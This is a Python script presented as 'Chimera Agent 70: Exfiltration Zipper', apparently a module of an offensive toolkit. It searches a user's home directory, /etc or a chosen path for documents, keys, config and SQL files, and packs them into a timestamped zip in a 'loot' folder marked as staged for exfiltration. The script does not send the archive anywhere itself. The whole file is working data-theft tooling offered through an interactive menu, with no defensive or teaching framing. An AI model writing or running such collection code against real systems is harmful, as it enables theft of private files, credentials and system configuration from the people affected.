import os
import sys
import zipfile
import time
from datetime import datetime

class ExfiltrationZipper:
    """
    Chimera Agent 70: Exfiltration Zipper
    Purpose: Recursive discovery, compression, and staging of high-value loot.
    """
    def __init__(self):
        self.script_dir = os.path.dirname(os.path.abspath(__file__))
        self.agent_root = os.path.dirname(self.script_dir)
        self.staging_dir = os.path.join(self.agent_root, "loot")
        
        # Military Grade "Interesting" Extensions
        self.targets = [".pdf", ".docx", ".xlsx", ".txt", ".key", ".config", ".conf", ".sql"]
        
        if not os.path.exists(self.staging_dir):
            os.makedirs(self.staging_dir)

    def compress_loot(self, source_path, archive_name):
        """Recursively finds target files and zips them."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        zip_filename = f"CHIMERA_DATA_{archive_name}_{timestamp}.zip"
        zip_path = os.path.join(self.staging_dir, zip_filename)

        print(f"[*] Agent 70: Commencing deep search in {source_path}...")
        count = 0

        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(source_path):
                # Skip the Chimera directory itself to avoid infinite loops
                if "chimera" in root.lower():
                    continue
                
                for file in files:
                    if any(file.lower().endswith(ext) for ext in self.targets):
                        file_path = os.path.join(root, file)
                        # Store file with relative path to preserve structure
                        arcname = os.path.relpath(file_path, source_path)
                        zipf.write(file_path, arcname)
                        count += 1

        if count > 0:
            print(f"[!!!] Agent 70: ARCHIVE COMPLETE. {count} files secured.")
            print(f"[+] Staged for Exfiltration: {zip_path}")
        else:
            print("[-] Agent 70: No high-value files found in target path.")
            if os.path.exists(zip_path):
                os.remove(zip_path)

    def menu(self):
        print("\n" + "="*60)
        print("   AGENT 70 :: EXFILTRATION ZIPPER :: CHIMERA SWARM")
        print("="*60)
        print("1. Target: Current User Home (~/)")
        print("2. Target: System Configs (/etc)")
        print("3. Target: Custom Path")
        print("0. Return to Commander")
        
        choice = input("\nSelect Target Area > ")
        
        if choice == "1":
            self.compress_loot(os.path.expanduser("~"), "HOME")
        elif choice == "2":
            # Note: Running on /etc usually requires sudo
            self.compress_loot("/etc", "SYSTEM_CONF")
        elif choice == "3":
            custom = input("Enter Path to Scour: ")
            if os.path.exists(custom):
                self.compress_loot(custom, "CUSTOM")
            else:
                print("[!] Path invalid.")
        elif choice == "0":
            sys.exit(0)

if __name__ == "__main__":
    zipper = ExfiltrationZipper()
    zipper.menu()
